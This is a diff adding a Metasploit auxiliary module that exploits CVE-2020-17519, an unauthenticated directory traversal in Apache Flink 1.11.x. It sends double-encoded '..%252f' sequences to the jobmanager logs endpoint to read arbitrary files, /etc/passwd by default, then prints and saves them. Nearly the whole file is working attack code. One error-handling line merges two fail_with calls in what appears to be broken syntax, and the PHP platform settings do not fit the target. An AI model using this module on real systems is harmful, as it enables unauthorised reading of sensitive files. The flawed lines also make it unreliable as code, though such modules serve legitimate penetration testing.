@@ -1,0 +1,72 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+    include Msf::Exploit::Remote::HttpClient
+    include Msf::Auxiliary::Scanner
+    include Msf::Auxiliary::Report
+
+      def initialize(info = {})
+          super(update_info(
+            info,
+            'Name'           => 'Apache Flink File Read Vulnerability',
+            'Description'    => %q{
+                This module exploits an unauthenticated directory traversal vulnerability
+                in Apache Flink version 1.11.0 (and released in 1.11.1 and 1.11.2 as well),
+                allowing arbitrary file read with the web server privileges
+            },
+            'Author'         =>
+              [
+                '0rich1 - Ant Security FG Lab', # Vulnerability discovery
+                'Hoa Nguyen - Suncsr Team',    # Metasploit module
+              ],
+            'License'        => MSF_LICENSE,
+            'References'     =>
+              [
+                ['CVE', '2020-17519'],
+                ['URL', 'http://www.openwall.com/lists/oss-security/2021/01/05/2'],
+                ['URL', 'https://www.tenable.com/cve/CVE-2020-17519']
+              ],
+            'Privileged'     => false,
+            'Platform'       => ['php'],
+            'Arch'           => ARCH_PHP,
+            'Targets'        => [['', {}]],
+            'DefaultTarget'  => 0,
+            'DisclosureDate' => 'Jan 05 2021'
+
+            ))
+
+            register_options([
+                OptInt.new('DEPTH',[true,'Traversal Depth',12]),
+                OptString.new('FILEPATH',[true,'The path file to read','/etc/passwd'])
+            ])
+            end
+
+            def run_host(ip)
+                traversal = '..%252f' * datastore['DEPTH']
+                filename = datastore['FILEPATH'].gsub("/","%252f")
+                filename = filename[1, filename.length] if filename =~ /^\//
+
+                res = send_request_cgi({
+                    'method' => 'GET',
+                    'uri' => normalize_uri(target_uri.path,'jobmanager','logs',"#{traversal}#{filename}"),
+                })
+
+                fail_with Failure::Unreachable, 'Connection failed' unless res fail_with Failure::NotVulnerable, 'Connection failed. Nothingn was downloaded' if res.code != 200
+                fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.length.zero?
+
+                print_status('Downloading file...')
+                print_line("\n#{res.body}\n")
+                  fname = datastore['FILEPATH']
+                  path = store_loot(
+                  'apache.traversal',
+                  'text/plain',
+                  ip,
+                  res.body,
+                  fname
+                )
+                print_good("File saved in: #{path}")
+            end
+        end
